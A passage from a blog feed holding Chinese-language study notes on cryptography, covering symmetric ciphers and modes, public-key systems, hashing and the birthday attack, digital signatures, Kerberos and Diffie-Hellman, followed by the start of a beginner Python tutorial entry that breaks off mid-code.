src="https://www.helloimg.com/images/2023/08/20/oSpwI1.png" alt="image.png"></p><h4 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h4><p>明文和密文长度<strong>128位</strong>，密钥长度可变(<strong>128&#x2F;192&#x2F;256位</strong>）<br>加解密使用不同的算法<br>置换、代替、代数运算<br>SP结构，基本轮函数迭代，迭代轮数可变(≥10)<br>字节替代 SubByte ()、行移位变换 ShiftRows()、列混合变换 MixColumns()、轮密钥加法 AddRoundKey()<br>ByteSub( )与ShiftRows( )运算次序可交换<br>列混合MixColumns()为线性变换</p><h4 id="分组密码的操作方式"><a href="#分组密码的操作方式" class="headerlink" title="分组密码的操作方式"></a>分组密码的操作方式</h4><h5 id="ECB"><a href="#ECB" class="headerlink" title="ECB"></a>ECB</h5><p>将每块明文加密成相应的密码块，若最后一块不足64bit，则用一些任意二进制序列填充<br>特点 ：  (1)  一种最简易的工作方式；<br>(2) 相同密钥作用下，密文块与明文块一一对应，易于暴露明文的固有格式；<br>                    (3) 各密文块间缺乏相关性，信息易于受到块替换攻击 </p><h5 id="CBC"><a href="#CBC" class="headerlink" title="CBC"></a>CBC</h5><p>加入反馈机制，当前明文块在加密之前要与前面的密文块进行异或<br>特点 ：  (1) 同一明文块会产生不同的密文块；<br>(2) 有误码扩散，若Ci在传送过程中出错，则解密时会造成mi和mi+1两个明文块都出错，<br>但后面的密文块仍然能自动正确恢复；<br>                    (3) 只有当所有64比特块到达后才能开始编解码</p><h5 id="CFB"><a href="#CFB" class="headerlink" title="CFB"></a>CFB</h5><p>为克服CBC方式的第(3)个问题，数据是按比分组小得多的单位进行加密的，密文依赖于前面所有的明文<br>特点 ：  (1) 移位寄存器的的内容与明文整个以前的历史有关，同样需要一个初始向量（寄存器初值）；<br>(2) 将分组密码转换为流密码（序列密码），实现即时加密； </p><h5 id="OFB"><a href="#OFB" class="headerlink" title="OFB"></a>OFB</h5><p>与CFB模式相似，但它是在块内部进行反馈，其反馈机制既不依赖明文也不依赖密文流<br>特点 ：  (1) 没有误码扩散，适用于传输信息长度变化较大的数据，如语音、图像等。<br>(2) 比CFB更易受对消息流的篡改，攻击者对密文的篡改难以检测。<br>(3) 链接相关性，密文与前面的明文无关。<br>(4) 应用时要求一次一密方式 (OTP，One-Time Pad)</p><h5 id="CTR（计数器模式）"><a href="#CTR（计数器模式）" class="headerlink" title="CTR（计数器模式）"></a>CTR（计数器模式）</h5><p>特点 ：  (1)具有随机访问特性，可随机对任意一个密文分组进行解密处理；<br>(2)处理效率高，可进行并行处理，提高数据吞吐量；<br>(3)同一明文块会产生不同的密文块；<br>(4)可提前进行预处理；<br>(5) 实现简单，加、解密阶段都只涉及加密函数。</p><h4 id="3DES"><a href="#3DES" class="headerlink" title="3DES"></a>3DES</h4><p>二重DES的加密，所用密钥的长度为 ：<br>56×2&#x3D;112 bits，二重DES很难抵挡住中间相遇攻击法 </p><p>到目前为止，还没有人给出攻击三重DES的有效方法，相对于单一DES来说，复杂性以指数形式增长。</p><h4 id="IDEA"><a href="#IDEA" class="headerlink" title="IDEA"></a>IDEA</h4><p>是对64bit大小的数据块加密的分组加密算法，密钥长度为128位<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1685713758611-d9747475-9d39-4822-901b-d0d4948f583f.png#averageHue=%238fc5ef&clientId=u435b6b3e-152a-4&from=paste&height=154&id=u36f4213e&originHeight=243&originWidth=791&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=50541&status=done&style=none&taskId=u20956ac1-61a2-40dc-89aa-e34a3df1373&title=&width=502.22224502967254" alt="image.png"></p><p>IDEA与DES的比较：<br>共同点：同属分组密码体制（分组长度也为64比特）<br>不同点：（1）IDEA密钥长度128位；<br>（2） IDEA的加解密子密钥不完全相同（但可相互导出）;<br>（3） IDEA可用软硬件实现，但倾向于软件实现；<br>（4） DES为Feistel结构，而IDEA不是。</p><h4 id="RC5"><a href="#RC5" class="headerlink" title="RC5"></a>RC5</h4><p>RC5加密明文块的长度为32，64，128 bits。并且对应同样长度的密文。密钥长度为从8到2040 bits<br><img src="https://www.helloimg.com/images/2023/08/20/oSpQAb.png" alt="image.png"></p><h4 id="SM4"><a href="#SM4" class="headerlink" title="SM4"></a>SM4</h4><p><strong>·</strong>加解密算法及密钥扩展都采用32轮非线性迭代结构。<br><strong>·</strong>数据分组长度、密钥长度&#x3D;128位（16Byte）<br><strong>·</strong>算法具有对合特性：解密算法和加密算法结构相同，只是轮密钥反序使用（与DES类似）<br><strong>·</strong>密码结构：非对称Feistel结构</p><h3 id="序列密码"><a href="#序列密码" class="headerlink" title="序列密码"></a>序列密码</h3><p>序列密码又称为流密码（stream cipher），它是一种对称密码体制，<br>特点：<br>l 明文消息按字符或比特逐位进行加密；<br>l 基于硬件电路实现，如链路密码机；<br>l 实现简单，加解密处理速度快；<br>l 没有或只有有限的错误传播;<br>l 多用于军事和外交等特殊通信领域。</p><p>密钥流序列具有如下性质：<br>Ø极大的周期<br>Ø良好的统计特性<br>Ø抗线性分析</p><h4 id="同步序列密码"><a href="#同步序列密码" class="headerlink" title="同步序列密码"></a><strong>同步序列密码</strong></h4><p>系统内部记忆元件的状态独立于明文或密文的叫做同步流密码，否则叫自同步流密码。<br>分组密码的<strong>OFB</strong>模式就是一个同步序列加密的例子。<br>特点：<br>l 无错误传播<br>l 有同步要求</p><h4 id="自同步序列密码"><a href="#自同步序列密码" class="headerlink" title="自同步序列密码"></a><strong>自同步序列密码</strong></h4><p>密钥流的产生与己经产生的一定数量的密文有关。<br>分组密码的<strong>CFB</strong>模式就是一个自同步序列加密的例子。<br>特点：<br>l 密钥流的产生与密文有关<br>l 有限错误传播<br>l 自同步</p><h4 id="LFSR-线性反馈移位寄存器"><a href="#LFSR-线性反馈移位寄存器" class="headerlink" title="LFSR-线性反馈移位寄存器"></a>LFSR-<strong>线性反馈移位寄存器</strong></h4><p>定义如果一个GF(2)上的n阶反馈移位寄存器的反馈函数形如<br>            <img src="https://www.helloimg.com/images/2023/08/20/oSppNo.png" alt="image.png"><br>其中ci∈GF(2)，1≤i≤n，则称其为线性反馈移位寄存器。否则，称其为非线性反馈移位寄存器。<br>            <img src="https://www.helloimg.com/images/2023/08/20/oSpzjD.png" alt="image.png"></p><p>如果直接用线性移位寄存器序列作为密钥序列，则在已知明文攻击的情况下，相应的序列密码体制是很不安全的。<br>可以对一个或多个线性移位寄存器序列进行非线性组合来获得在序列密码中安全性良好的非线性序列</p><p>基于LFSR的序列密码生成器:<br>Geffe生成器<br>钟控生成器<br>交错停走式生成器</p><h4 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h4><p>密钥长度可变的流加密算法簇<br>其核心部分的S-box长度可为任意，但一般为256字节。<br>RC4算法的原理较简单，主要有两个算法：<br>（1）密钥调度算法KSA<br>（2）伪随机数生成算法PRGA</p><p>密钥调度算法的作用是将一个随机密钥（典型大小是40位~256位）变换成一个初始置换，即相当于初始化状态矢量S，然后伪随机数生成算法PRGA利用该初始置换生成一个伪随机输出序列。<br>加密时，将K的值与下一个明文字节异或；<br>解密时，将K的值与下一个密文字节异或。<br>为了保证安全强度，目前的RC4至少使用128位的密钥。</p><h2 id="非对称密码"><a href="#非对称密码" class="headerlink" title="非对称密码"></a>非对称密码</h2><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>公钥密码又称为双钥密码和非对称密码，是1976年由Diffie和Hellman提出</p><p>对公钥密码的要求  ：<br>(1) 生成密钥对的计算很容易；<br>(2) 发送方A用接收方B的公钥PKB生成密文c，计算上是容易的。 c &#x3D; EPKB(m)<br>(3)接收方B用自己的私钥SKB对 c 解密，在计算上是容易的。 m &#x3D; DSKB (c) &#x3D; DSKB(EPKB(m))<br>(4)攻击者通过B的公钥PKB计算出私钥SKB在计算上不可行。<br>(5)攻击者通过B的公钥PKB和密文c还原明文m在计算上不可行。<br><img src="https://www.helloimg.com/images/2023/08/20/oSpDES.png" alt="image.png"></p><blockquote><p><strong>三类算法: RSA, ElGamal, ECC</strong><br><strong>(1) RSA</strong><br><strong>–基础: IFP(Integer Factorization Problem)</strong><br><strong>–加&#x2F;解密、密钥交换、数字签名</strong><br><strong>–使用最广泛</strong><br><strong>(2)ElGamal</strong><br><strong>–基础: DLP(Discrete Logarithm Problem)</strong><br><strong>–加&#x2F;解密、密钥交换、数字签名</strong><br><strong>(3)ECC</strong><br><strong>–基础: ECDLP(Elliptic Curve Discrete Logarithm Problem)</strong><br><strong>–加&#x2F;解密、密钥交换、数字签名</strong><br><strong>–密钥短，速度快</strong><br>**  –已开始广泛应用**</p></blockquote><h4 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h4><p>RSA的基本性质 ：<br>（1）加密和解密运算具有可交换性<br>（2）加解密算法的有效性<br>（3）在计算上由公开的加密密钥不能求出解密密钥<br>RSA的算法描述 ：<br><img src="https://www.helloimg.com/images/2023/08/20/oSpIOC.png" alt="image.png"></p><p><img src="https://www.helloimg.com/images/2023/08/20/oSp6kQ.png" alt="image.png"></p><h4 id="ElGamma"><a href="#ElGamma" class="headerlink" title="ElGamma"></a>ElGamma</h4><p>密文空间大于明文空间。明文空间为Zp<em>，而密文空间为 Zp</em>× Zp<em>，也即对于每个明文，其密文由2个Zp</em>上的元素组成<br>ElGamal加密体制通过明文 m乘以yBk掩盖明文，产生c2 ；同时值c1 &#x3D; ak也作为密文的一部分进行传送。<br><img src="https://www.helloimg.com/images/2023/08/20/oSpgIv.png" alt="image.png"><br>ElGamal公开密钥密码算法的安全性建立在<strong>计算Zp上离散对数的困难性上</strong><br>要使用不同的随机数k来加密不同的信息<br>随机数k不可预测</p><p><img src="https://www.helloimg.com/images/2023/08/20/oSpK1t.png" alt="image.png"></p><h4 id="ECC-椭圆曲线密码体制"><a href="#ECC-椭圆曲线密码体制" class="headerlink" title="ECC-椭圆曲线密码体制"></a>ECC-椭圆曲线密码体制</h4><p>“椭圆曲线”并非一定是椭圆，是指由二元三次方程：<br><img src="https://www.helloimg.com/images/2023/08/20/oSprRE.png" alt="image.png"><br> 所描述的曲线<br><img src="https://www.helloimg.com/images/2023/08/20/oSpVAY.png" alt="image1.png"></p><h4 id="M-V"><a href="#M-V" class="headerlink" title="M-V"></a>M-V</h4><p>M－V 公钥密码体制即是在椭圆曲线上的一个有效实现<br><img src="https://www.helloimg.com/images/2023/08/20/oSpYN9.png" alt="image.png"><br><img src="https://www.helloimg.com/images/2023/08/20/oSpfuX.png" alt="image.png"></p><h4 id="SM2"><a href="#SM2" class="headerlink" title="SM2"></a>SM2</h4><p>SM2是一种基于椭圆曲线密码学的公钥密码算法，由中国密码标准化工作组推荐<br>SM2算法的主要内容包括３部分：<br>数字签名算法；密钥交换协议；公钥加密算法；<br><strong>SM2算法的特点</strong>如下：</p><ol><li>安全性高：SM2算法采用了椭圆曲线密码学中的离散对数问题，能够提供较高的安全性。</li><li>签名速度快：SM2算法的签名速度比传统RSA算法要快，适合用于大量数据的签名操作。</li><li>密钥长度短：SM2算法的密钥长度比传统RSA算法要短，节省了存储空间和传输带宽。</li><li>支持国密标准：SM2算法是中国国家密码局发布的国家密码算法标准，符合国密要求，</li><li>公开透明：SM2算法设计和安全性分析是公开透明的，有助于对算法的安全性进行评估和验证。</li></ol><h1 id="4-完整性"><a href="#4-完整性" class="headerlink" title="4.完整性"></a>4.完整性</h1><p>鉴别是通过验证用户或实体的身份以确保其合法性的过程可以将鉴别分为两种类型：报文鉴别和实体鉴别。</p><ol><li>报文鉴别：报文鉴别是指通过加密算法或哈希算法对报文进行处理，生成报文的认证码或数字签名，并将其附加在报文中，以确保报文的完整性和真实性。</li><li>实体鉴别：实体鉴别是指验证通信实体的身份，以确保通信双方的身份认证和数据传输安全。</li></ol><h2 id="报文鉴别"><a href="#报文鉴别" class="headerlink" title="报文鉴别"></a>报文鉴别</h2><h3 id="基于加密"><a href="#基于加密" class="headerlink" title="基于加密"></a>基于加密</h3><p>略</p><h3 id="基于hash"><a href="#基于hash" class="headerlink" title="基于hash"></a>基于hash</h3><p><strong>（1）密码散列函数的概念和6个基本性质</strong><br>密码学中的散列函数又称为哈希函数(Hash函数)杂凑函数，它是一种单向密码体制,是一个从明文到密文的不可逆映射,只有加密过程,没有解密过程。<br>设散列函数为h(m)，其有以下基本特性:<br>(1)h(m)算法公开,不需要密钥。<br>(2)具有数据压缩功能，可将任意长度的输入数据转换成一个周定长度的输出。<br>(3)对任何给定的 m,h(m)易于计算<br>(4)具有单向性。给定消息的散列值h(m),要得到消息m在计算上不可行;<br>(5)具有弱抗碰撞性(Weak Collision Resistance,也称弱抗冲突性)。对任何给定的消息m,寻找与m 不同的消息m使得它们的散列值相同即h(m)&#x3D;h(m),在计算上不可行。<br>(6)具有强抗碰撞性(Strong Collision Resistance,也称强抗冲突性)寻找任意两个不同的消息m和m使得h(m)-h(m)在计算上不可行。</p><p><strong>（2) 理解哈希函数的抗碰撞安全性</strong><br>所谓散列函数的碰撞是指若两个消息m与m’，m不等于m’，但它们的散列值相等,即h(m)&#x3D;h(m’)，那么，则把这种情况称为发生了碰撞或冲突。由于输入消息的长度可以是任意的,但散列函数输出的散列值的长度是固定的,如对于散列值长度为160位的散列函数而言,可能的散列值总数为 2^160。显然,不同的消息就有可能会产生相同的散列值，即散列函数具有碰撞的不可避免性。但是,散列算法的安全性要求找到一个碰撞在计算上是不可行的。也就是说,要求碰撞是不可预测的,攻击者不能指望对输入消息的预期改变可以得到一个相同的散列值。</p><p>**  (3)散列函数的基本应用方式（基于散列函数的 6 种报文鉴别方式，掌握 P93，图 5.16)**<br>利用密码技术设计提供信息的机密性、完整性和可鉴别性服务的信息安全传输方案<br><img src="https://www.helloimg.com/images/2023/08/20/oSpjEg.jpg" alt="d1521d574531184574d6b05ff1c170c.jpg"><br>**  (4) 单向散列函数的设计、构造问题**<br><strong>简单的散列函数的不安全性</strong></p><ol><li>易于碰撞攻击：简单的散列函数通常使用较短的散列值，因此很容易出现碰撞，即不同的输入数据产生相同的散列值。攻击者可以利用碰撞来欺骗系统，从而执行未经授权的操作。</li><li>易于彩虹表攻击：攻击者可以构建彩虹表，其中包含了所有可能的输入数据及其对应的散列值。然后，攻击者可以将目标散列值与彩虹表中的散列值进行比较，以找到对应的输入数据。</li><li>易于字典攻击：攻击者可以使用已知的密码字典或常见密码列表来生成散列值，并将其与目标散列值进行比较。由于简单的散列函数通常使用较弱的算法，因此很容易受到字典攻击的影响。</li><li>易于生日攻击：如果散列函数的输出长度较短，攻击者可以使用生日攻击来寻找碰撞。生日攻击利用概率学原理，在较短的时间内就能找到相同的散列值。</li></ol><p><strong>散列函数的生日攻击问题</strong><br>与散列函数相关的类似问题可表述如下：给定一个散列函数h的输出长度为m位，共有2^m个可能的散列值输出，如果让散列函数h接收k个随机输入产生集合X,再使用另外k个随机输入产生集合Y,问必须为多大才能使两个集合产生相同散列值输出的概率大于0.521<br>这时,n&#x3D;2^m,由式(5.3)有：<br><img src="https://www.helloimg.com/images/2023/08/20/oSpuOM.png" alt="image.png"></p><p>这种寻找散列函数h的具有相同输出的两个任意输入的攻击方式称为生日攻击。<br>下面举一个简单的示例来说明这种针对散列函数的生日攻击过程。还是假设 Alice是一家计算机公司的总经理，要从Bob的公司购买一批计算机。经过双方协商,确定了5000 元&#x2F;台的价格,于是 Bob 发来合同的电子文本征得 Alice 的同意，Alice确认后计算出这一合同文本的散列值，用自己的私钥进行数字签名并发回给 Bob,以此作为 Alice对合同样本的确认。<br>但是,Bob在发给Alice 合同样本前，首先写好一份正确的合同,然后标出这份合同中无关紧要的地方。由于合同总是由许许多多的句子构成的,而这些句子往往可以有很多不同的表达方式,所以一份合同总可以有很多种不同的说法,却都能表达同样的意思。现在Bob只要把这些意思相同的合同都列出来作为一组，然后再把每一份合同当中标明的价格从5000元&#x2F;台改为10000元&#x2F;台，并且把修改过的合同也集中起来作为另外一组，这样他的手中就有了两组合同:一组的价格条款都是 5000元&#x2F;台的，而另一组的价格都是 10000元&#x2F;台然后，Bob只要把这两组合同的散列值都计算一遍，从当中挑出一对散列值相同的,把这一对当中的那份写明5000元&#x2F;台的合同作为合同样本给Alice，并交由Alice进行签名而自己则偷偷把那份10000元&#x2F;台的合同藏起来，以便在将来进行欺诈。<br>从生日攻击的理论上来讲,如果假设上述事例使用的散列函数输出为64位,那么 Bob只要找到合同中32个无关紧要的地方,来分别构成5000元&#x2F;台和10000元&#x2F;台两组合同，有0.5以上的概率能在这两组合同中找到碰撞,来实现他的诈骗行为。</p><h4 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h4><p>略</p><h4 id="SHA-1"><a href="#SHA-1" class="headerlink" title="SHA-1"></a>SHA-1</h4><p>输入：最大长度为264-1位的消息；<br>输出：160位消息摘要；<br>处理：输入以512位数据块为单位处理</p><h4 id="SHA-256"><a href="#SHA-256" class="headerlink" title="SHA-256"></a>SHA-256</h4><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1687268590933-752c9a3d-2199-4c94-9e58-3b547709c2e1.png#averageHue=%23d4eaf5&clientId=u17e51720-26c7-4&from=paste&height=137&id=ue69452ef&originHeight=215&originWidth=1015&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=41253&status=done&style=none&taskId=uaa1fb1c5-22b6-4a3e-a9f0-f292db9fae8&title=&width=644.4444737106418" alt="image.png"></p><h4 id="SM3"><a href="#SM3" class="headerlink" title="SM3"></a>SM3</h4><h4 id="SM3密码杂凑算法的设计主要遵循以下原则"><a href="#SM3密码杂凑算法的设计主要遵循以下原则" class="headerlink" title="SM3密码杂凑算法的设计主要遵循以下原则:"></a>SM3密码杂凑算法的设计主要遵循以下原则:</h4><ol><li>能够有效抵抗比特追踪法及其他分析方法;</li><li>软硬件实现需求合理;</li><li>在保障安全性的前提下，综合性能指标与SHA-256同等条件下相当</li></ol><h2 id="数字签名（实体鉴别）"><a href="#数字签名（实体鉴别）" class="headerlink" title="数字签名（实体鉴别）"></a>数字签名（实体鉴别）</h2><p><strong>(1) 数字签名的概念，基本特性</strong><br>数字签名实际上是一个把数字形式的消息和某个源发实体相联系的数据串，把它附加在一个消息或完全加密的消息上,以便于消息的接收方能够鉴别消息的内容，并证明消息只能源发于所声称的发送方。<br>迅速的、远距离的、更高的安全性<br>(1)签名是不可伪造的。<br>(2)签名是不可抵赖的。<br>(3)签名是可信的。<br>(4)签名是不可复制的。<br>(5)签名的消息是不可篡改的。</p><p><strong>(2) 数字签名两种执行方式</strong><br><strong>1.直接方式</strong><br>直接方式是指数字签名的执行过程只有通信双方参与，并假定双方有共享的秘密密钥，或者接收一方知道发送方的公开密钥。例如消息接收者可以获得消息发送者的公钥,发送者用其自己的私钥对整个消息或者消息散列码进行签名来形成数字签名。直接数字签名有一些共同的缺点:方案的有效性依赖于发送方秘密密钥的安全性。如果发送方想对已发出的消息予以否认,就可以声称自己的秘密密钥已丢失或者被盗，因此自己的数字签名是他人伪造的。可以采取某些行政管理手段,虽然不能避免,但可在某种程度上减弱这种威胁。例如,要求每一个被签名的消息都包含一个时间戳,标明消息被签名的日期和时间,并要求秘密密钥一旦丢失,就要立即向管理机构报告。但这种方式的数字签名仍然存在着假冒签名的威胁,假设发送方的秘密密钥在时间T被窃取，攻击者可以伪造一个消息,用发送方的秘密密钥对其签名并加上丁以前的时间戳。<br><strong>2.具有仲裁的方式</strong><br>具有仲裁的数字签名是在通信双方的基础上引人了第三方仲裁者参与。通常的做法是所有从发送方到接收方的签名消息首先送到仲裁者，仲裁者将消息及其数字签名进行一系列的测试，以检查其来源和内容,并将消息加上时间戳,与已被仲裁者验证通过的数字签名一起发送给接收方。在这种方式下,仲裁者扮演裁判的角色,起着重要作用并应取得所有的参与者的信任。下面给出几个需要仲裁者的数字签名方案。其中S表示发送方,R表示接收方,A是仲裁者，m是传送的消息。<br>方案一:对称加密,仲裁者可以看到消息内容<br>方案二:对称加密，仲裁者不能看到消息内容<br>方案三:公钥加密，仲裁者不能看到消息内容</p><p><strong>(3)数字签名的应用过程</strong><br>（1）系统的初始化过程：产生的数字签名方案中用到的一切参数，有公开的，也有秘密的。<br>（2）签名产生过程：此过程用户利用给定的算法对消息产生签名，这种签名过程可公开也可不公开。<br>（3）签名验证过程：验证者利用公开验证方法对给定消息的签名进行验证，得出签名的有效性。</p><p><strong>(4) 热练掌握典型公明密码体制的数字签名算法(RSA、EIGamal、ECDSA)原理、计方法与应用</strong><br><strong>ElGamal:</strong><br><img src="https://www.helloimg.com/images/2023/08/20/oSzoLA.png" alt="image.png"><br><img src="https://www.helloimg.com/images/2023/08/23/oSfan0.png" alt="image.png"></p><p><strong>(5) 了解国密SM2</strong><br>SM2是一种基于椭圆曲线密码学的公钥密码算法，由中国密码标准化工作组推荐<br>SM2算法的主要内容包括３部分：<br>数字签名算法；密钥交换协议；公钥加密算法；<br><strong>SM2算法的特点</strong>如下：</p><ol><li>安全性高：SM2算法采用了椭圆曲线密码学中的离散对数问题，能够提供较高的安全性。</li><li>签名速度快：SM2算法的签名速度比传统RSA算法要快，适合用于大量数据的签名操作。</li><li>密钥长度短：SM2算法的密钥长度比传统RSA算法要短，节省了存储空间和传输带宽。</li><li>支持国密标准：SM2算法是中国国家密码局发布的国家密码算法标准，符合国密要求，</li><li>公开透明：SM2算法设计和安全性分析是公开透明的，有助于对算法的安全性进行评估和验证。</li></ol><h1 id="5-身份鉴别技术"><a href="#5-身份鉴别技术" class="headerlink" title="5.身份鉴别技术"></a>5.身份鉴别技术</h1><p><strong>(1) 身份鉴别的基本方式(鉴别实体所知、所拥有、所具有的唯一特征)</strong><br>验证实体所知什么，如一个秘密的口令或通行字。<br>验证实体拥有什么，如信物、通行证、智能IC卡。<br>验证实体不可改变的特性，如指纹、声音等生物学测定得来的标识特征。</p><p><strong>(2)基于动态口令的身份鉴别原理与实现方案</strong><br>一次性口令的主要思路是：在登录过程中加入不确定因素，使每次登录传送的鉴别信息都不相同，以提高登录过程安全性。</p><p><strong>(3)密码协议对抗重放攻击的两种基本方法（时间戳、质询-响应机制）</strong><br><img src="https://www.helloimg.com/images/2023/08/23/oSf17m.png" alt="image.png"></p><p><img src="https://www.helloimg.com/images/2023/08/23/oSfXBh.png" alt="image.png"><br><strong>(4) Kerberos 系统的密码学特点(基于对称密码体制)和基本原理</strong><br>Kerberos 是一种网络身份验证协议，它基于对称密码体制来提供身份验证和授权服务。Kerberos 的密码学特点主要包括以下几个方面：</p><ol><li>对称加密算法：Kerberos 使用对称密码体制中的加密算法来保证通信机密性，这些算法包括 DES、3DES、AES 等。</li><li>密钥分发：Kerberos 采用密钥分发技术，即在用户登录时，Kerberos 服务器会向用户分发一个临时密钥（也称为票据授权票据TGT），用户在后续的通信中使用该密钥来进行身份验证和授权。</li><li>时钟同步：Kerberos 要求网络中所有的计算机时钟都要与 Kerberos 服务器的时钟同步，以避免时钟漂移带来的安全问题。</li></ol><p><strong>Kerberos 的基本原理如下：</strong></p><ol><li>身份验证：用户在本地计算机上输入用户名和密码，本地计算机将该信息发送给 Kerberos 服务器。Kerberos 服务器验证用户信息的正确性，如果验证通过，Kerberos 服务器向用户发送一个 TGT，该 TGT 包含了用户的身份信息和一个临时密钥。</li><li>授权：用户在访问网络资源时，需要提供 TGT，并向 Kerberos 服务器发起请求。Kerberos 服务器验证 TGT 的正确性，如果通过，就向用户发送一个服务票据（Service Ticket），该票据包含了用户的身份信息和一个用于访问特定资源的临时密钥。</li><li>资源访问：用户使用服务票据来访问网络资源，本地计算机将服务票据发送给资源服务器进行验证，如果通过，用户得到了访问资源的权限。</li></ol><p>总之，Kerberos 是一种安全可靠的身份验证协议，它基于对称密码体制，通过密钥分发、时钟同步等技术来确保安全性和可靠性。</p><h1 id="6-抗抵赖"><a href="#6-抗抵赖" class="headerlink" title="6.抗抵赖"></a>6.抗抵赖</h1><p>对称、非对称加密，数字签名</p><h1 id="7-密钥管理"><a href="#7-密钥管理" class="headerlink" title="7.密钥管理"></a>7.密钥管理</h1><p><strong>(1)管理基本内容和概念</strong><br>密钥管理是一门综合性的技术，涉及密钥的产生、检验、分发、传递、保管、使用、销毁的全部过程，还与密钥的行政管理制度以及人员的素质密切相关。<br>决定整个密码体制安全性的因素是密钥的保密性（“一切秘密予于密钥之中！”）</p><p><strong>(2)理解密钥分配与密钥协商的目标与特点</strong><br>密钥分配与密钥协商过程都是用以在保密通信双方之间安全建立通信所使用的密钥的协议(或机制)<br>密钥分配<br>保密通信中的一方（包括可信第三方）生成并选择秘密密钥，然后将其安全地传送给通信的相关各方。典型协议：Kerboros密钥分配协议<br>密钥协商<br>通常是一种协议，利用该协议通信双方可以在一个公开的信道上通过相互传送一些消息来共同建立一个安全的共享秘密密钥。在密钥协商中，双方共同建立的秘密密钥通常是双方输入消息的一个函数。典型协议： Diffie-Hellman密钥交换协议 </p><p><strong>(3)掌握公钥证书的概念与基本内容,以及证书真实性、有效性的确认(包括用 CA 的公验证数字签名)，持有人的确认方法。</strong><br>公钥证书是一种数字证书，用于验证公钥的真实性和所有者的身份。它包含公钥、所有者的身份信息和证书颁发机构（CA）的数字签名。以下是公钥证书的基本内容：</p><ol><li>：证书中包含了CA的数字签名，以证明该证书是由CA签署的。</li></ol><p>为了确认证书的真实性和有效性，需要使用CA的公钥验证数字签名。这个过程包括以下步骤：</p><ol><li>获取CA的公钥：从CA的网站或其他可靠来源获取CA的公钥。</li><li>验证数字签名：使用CA的公钥验证证书中的数字签名。如果数字签名可以被验证，则证明证书是由CA签署的，因此证书是真实和有效的。</li></ol><p>对于证书的持有人来说，他们可以通过以下方法确认其证书的真实性和有效性：</p><ol><li>查看证书信息：检查证书中包含的信息是否与自己的身份信息匹配。如果信息不匹配，则证书可能是伪造的。</li><li>验证数字签名：使用CA的公钥验证证书中的数字签名。如果数字签名可以被验证，则证明证书是由CA签署的，因此证书是真实和有效的。</li><li>核实证书颁发机构：查看证书中的颁发机构，并确保该机构是可信任的CA。</li><li>检查证书有效期：确保证书在有效期内。如果证书已过期，则证书不再有效。</li></ol><p><strong>(4)Diffie-Hellman 密钥交换算法及安全性基础，熟练掌握计算方法及应用中的相关问题。</strong><br>Diffie-Hellman（DH）密钥交换算法是一种基于离散对数问题的公钥密码学算法，用于在不安全的通信信道上安全地交换密钥。DH 算法的安全性基于离散对数难题，即给定一个大素数 p，以及 a 和 b 两个整数，计算 a^x mod p 和 b^y mod p 的值很容易，但是由 a^x mod p 和 b^y mod p 计算出共享密钥 g^(xy) mod p 则非常困难。<br>DH 密钥交换算法的基本原理如下：</p><ol><li>双方协商素数：双方预先协商一个大素数 p 和一个原根 g。</li><li>双方生成私钥：双方分别生成自己的私钥 x 和 y，私钥是一个随机数。</li><li>双方计算公钥：双方分别根据自己的私钥和协商的素数和原根计算出自己的公钥。</li><li>双方交换公钥：双方将自己的公钥传输给对方。</li><li>双方计算共享密钥：双方使用对方传输过来的公钥以及自己的私钥计算出共享密钥。</li></ol><p>DH 密钥交换算法的计算方法如下：</p><ol><li>双方协商素数：选取一个大素数 p 和一个原根 g。</li><li>双方生成私钥：生成一个随机数 x 和 y，作为自己的私钥。</li><li>双方计算公钥：计算出公钥 A 和 B，其中 A &#x3D; g^x mod p，B &#x3D; g^y mod p。</li><li>双方交换公钥：将 A 和 B 传输给对方。</li><li>双方计算共享密钥：计算出共享密钥 K，其中 K &#x3D; B^x mod p &#x3D; A^y mod p。</li></ol><p>DH 密钥交换算法的安全性主要基于离散对数难题，即计算出共享密钥 K 非常困难。如果攻击者能够通过窃取公开信息或通过其他手段计算出 K，则 DH 密钥交换算法的安全性将受到威胁。因此，在实际应用中，通常需要使用其他加密算法来对 DH 密钥交换算法进行补充，以增强其安全性。<br>总之，DH 密钥交换算法是一种基于离散对数问题的公钥密码学算法，用于在不安全的通信信道上安全地交换密钥。它的安全性基于离散对数难题，通过协商素数、生成私钥、计算公钥、交换公钥和计算共享密钥等步骤来实现。</p>]]></content>
      
      
      <categories>
          
          <category> 专业课程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python从入门到实践</title>
      <link href="/post/c992e850.html"/>
      <url>/post/c992e850.html</url>
      
        <content type="html"><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="等待用户输入"><a href="#等待用户输入" class="headerlink" title="等待用户输入"></a>等待用户输入</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">input</span>(<span class="string">&quot;\n\n按下 enter 键后退出。&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="同一行显示多条语句"><a href="#同一行显示多条语句" class="headerlink" title="同一行显示多条语句"></a>同一行显示多条语句</h2><p>Python 可以在同一行中使用多条语句，语句之间使用分号 ; 分割，以下是一个简单的实例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys; x = <span class="string">&#x27;runoob&#x27;</span>; sys.stdout.write(x + <span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="print-输出"><a href="#print-输出" class="headerlink" title="print 输出"></a>print 输出</h2><p>print 默认输出是换行的，如果要实现不换行需要在变量末尾加上 end&#x3D;””：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">x=<span 